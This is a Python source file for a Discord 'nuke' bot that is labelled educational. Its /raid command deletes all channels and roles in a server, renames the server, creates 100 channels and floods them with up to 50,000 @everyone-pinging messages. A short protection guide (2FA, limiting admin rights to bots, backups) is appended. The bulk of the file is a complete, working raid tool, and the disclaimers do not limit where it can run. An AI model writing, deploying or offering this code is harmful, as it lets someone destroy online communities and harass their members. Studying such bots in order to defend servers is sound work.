import discord
from discord.ext import commands
import asyncio
import os

# ========== CONFIGURATION ==========
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 1088143400496279552

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

active_demo = {}

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Educational Demo Bot ready - {bot.user}")
    print(f"Owner ID: {OWNER_ID}")

@bot.tree.command(name="raid", description="[OWNER ONLY] Educational nuke demonstration")
async def raid(
    interaction: discord.Interaction,
    message: str = "⚠️ THIS SERVER HAS BEEN NUKED ⚠️",
    ping: str = "yes",
    amount: int = 5000
):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can run this.", ephemeral=True)
    
    if not interaction.guild.me.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Bot needs Administrator permission.", ephemeral=True)
    
    await interaction.response.send_message(f"⚡ **EDUCATIONAL NUKE DEMO STARTING**\nSending {amount} messages...", ephemeral=False)
    
    ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
    msg_amount = min(amount, 50000)
    ping_text = "@everyone " if ping_enabled else ""
    
    guild = interaction.guild
    active_demo[guild.id] = True
    
    # Create log channel
    log_channel = await guild.create_text_channel("🔴-NUKED-BY-DEMO")
    await log_channel.send("💀 **EDUCATIONAL NUKE DEMO** 💀")
    
    messages_sent = 0
    
    async def spam_channel_fast(channel, msgs_to_send):
        nonlocal messages_sent
        try:
            for i in range(msgs_to_send):
                if not active_demo.get(guild.id):
                    break
                await channel.send(f"{ping_text}{message}")
                messages_sent += 1
        except:
            pass
    
    async def create_and_spam_fast(channel_num):
        try:
            channel = await guild.create_text_channel(f"nuked-{channel_num}")
            msgs_for_channel = msg_amount // 100 + 1
            await spam_channel_fast(channel, msgs_for_channel)
        except:
            pass
    
    try:
        # Delete all channels except log
        await log_channel.send("📢 Deleting all channels...")
        delete_tasks = [channel.delete() for channel in guild.channels if channel != log_channel]
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        await asyncio.sleep(1)
        
        # Create 100 channels and spam
        await log_channel.send(f"📢 Creating 100 channels and spamming {msg_amount} messages...")
        
        CHANNEL_COUNT = 100
        channel_tasks = [create_and_spam_fast(i) for i in range(CHANNEL_COUNT)]
        await asyncio.gather(*channel_tasks, return_exceptions=True)
        
        # Rename server
        await guild.edit(name="🔥 NUKED BY DEMO 🔥")
        
        # Delete roles
        role_tasks = []
        for role in guild.roles:
            if not role.is_default() and not role.managed and role != guild.me.top_role:
                role_tasks.append(role.delete())
        if role_tasks:
            await asyncio.gather(*role_tasks, return_exceptions=True)
        
        await log_channel.send(f"✅ Demo complete! Sent {messages_sent} messages")
        
        # Educational summary
        embed = discord.Embed(
            title="💀 EDUCATIONAL NUKE DEMO COMPLETE 💀",
            description=f"**What just happened:**\n\n"
                       f"🗑️ **ALL channels deleted**\n"
                       f"📁 **100 new channels** created\n"
                       f"📛 **Server renamed**\n"
                       f"👑 **ALL roles deleted**\n"
                       f"💬 **{messages_sent} spam messages** sent\n"
                       f"🔔 **@everyone pings**: {'ON' if ping_enabled else 'OFF'}\n\n"
                       f"**🚨 PROTECT YOUR SERVER:**\n"
                       f"• NEVER give Administrator to untrusted bots\n"
                       f"• Use 2FA on all administrator accounts\n"
                       f"• Set verification level to HIGH\n"
                       f"• Use backup bots (like Xenon) to save server structure\n\n"
                       f"**⚠️ This was an EDUCATIONAL DEMO on a TEST server**\n"
                       f"Delete this server to clean up.",
            color=discord.Color.red()
        )
        await log_channel.send(embed=embed)
        
        # DM owner
        try:
            owner = await bot.fetch_user(OWNER_ID)
            await owner.send(embed=embed)
        except:
            pass
        
    except Exception as e:
        await log_channel.send(f"❌ Error: {e}")
    finally:
        active_demo[guild.id] = False

@bot.tree.command(name="stopraid", description="[OWNER ONLY] Emergency stop")
async def stopraid(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can stop the demo.", ephemeral=True)
    
    if interaction.guild.id in active_demo:
        active_demo[interaction.guild.id] = False
        await interaction.response.send_message("🛑 **Educational demo stopped**", ephemeral=False)
    else:
        await interaction.response.send_message("No active demo.", ephemeral=True)

@bot.tree.command(name="protect", description="How to protect your server from nuke bots")
async def protect(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ How to Protect Your Server from Nuke Bots",
        description="Educational security guide",
        color=discord.Color.green()
    )
    embed.add_field(name="1. NEVER give Admin to untrusted bots", 
                    value="Review permissions before inviting any bot.", inline=False)
    embed.add_field(name="2. Enable 2FA", 
                    value="All administrator accounts must have 2FA enabled.", inline=False)
    embed.add_field(name="3. Server Verification Level", 
                    value="Set to HIGH (member must be registered for 10+ minutes).", inline=False)
    embed.add_field(name="4. Use Backup Bots", 
                    value="Xenon can save/restore your entire server structure.", inline=False)
    embed.add_field(name="5. Audit Logs", 
                    value="Check audit logs regularly for mass channel creation or deletion.", inline=False)
    embed.add_field(name="6. Emergency Roles", 
                    value="Create a role with 'Manage Channels' that can stop raids quickly.", inline=False)
    embed.set_footer(text="Educational purposes only - Stay safe!")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="commands", description="Show all commands")
async def cmd_list(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Educational Nuke Demo Bot",
        description="⚠️ EDUCATIONAL ONLY - Run on test servers",
        color=discord.Color.blue()
    )
    embed.add_field(name="/raid [message] [ping] [amount]", 
                    value="Start nuke demonstration:\n"
                          "• Deletes ALL channels\n"
                          "• Creates 100 spam channels\n"
                          "• Spams your message\n"
                          "• Renames server\n"
                          "• Deletes all roles\n\n"
                          "Example: `/raid message:\"GET NUKED\" ping:yes amount:10000`", 
                    inline=False)
    embed.add_field(name="/stopraid", value="Emergency stop the demo", inline=False)
    embed.add_field(name="/protect", value="Show server protection guide", inline=False)
    embed.add_field(name="/commands", value="Show this help", inline=False)
    embed.set_footer(text="⚠️ EDUCATIONAL ONLY - Shows why you should NEVER give Admin to untrusted bots")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

if __name__ == "__main__":
    if not TOKEN:
        print("ERROR: DISCORD_TOKEN not set")
        exit(1)
    bot.run(TOKEN)
